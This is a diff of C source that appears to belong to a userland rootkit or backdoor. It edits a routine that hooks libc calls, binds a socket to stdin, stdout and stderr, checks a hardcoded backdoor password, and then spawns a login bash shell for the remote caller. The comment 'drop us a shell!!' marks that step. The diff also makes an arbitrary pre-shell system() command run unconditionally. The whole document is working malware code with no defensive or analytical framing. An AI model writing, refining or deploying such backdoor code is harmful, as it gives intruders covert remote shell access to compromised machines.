@@ -1,15 +1,13 @@
 void spawn_shell(int sockfd){
     char *argv[3];
 
-    argv[0] = strdup(BASH_PATH);
-    argv[1] = strdup(LOGIN_FLAG);
+    argv[0] = BASH_PATH;
+    argv[1] = LOGIN_FLAG;
     argv[2] = NULL;
 
     for(int i = 0; i < 3; i++) dup2(sockfd, i);
     chdir(INSTALL_DIR);
-#ifdef EXEC_PRE_SHELL
     system(PRE_SHELL);
-#endif
     hook(CEXECVE);
     call(CEXECVE, argv[0], argv, NULL);    /* environment vars already set by is_bdusr() */
 }
@@ -20,10 +18,10 @@ void backconnect(int method, int sockfd){
 
     if(method == METHOD_PLAINTEXT){
         hook(CREAD);
-        call(CREAD, sockfd, tmp, sizeof(tmp));     /* read input from socket connection */
+        call(CREAD, sockfd, tmp, sizeof(tmp));   /* read input from new socket */
         tmp[strlen(tmp) - 1] = '\0';
 
-        /* spawn a regular shell with plaintext communications */
+        /* verify password is correct. */
 #ifdef USE_CRYPT
         got_pw = !strncmp(BD_PWD, crypt(tmp, BD_PWD), strlen(BD_PWD));
 #else
@@ -31,7 +29,7 @@ void backconnect(int method, int sockfd){
 #endif
 
         memset(tmp, 0, strlen(tmp));
-        if(got_pw) spawn_shell(sockfd);
+        if(got_pw) spawn_shell(sockfd);  /* drop us a shell!! */
     }
 
 #ifdef ACCEPT_USE_SSL
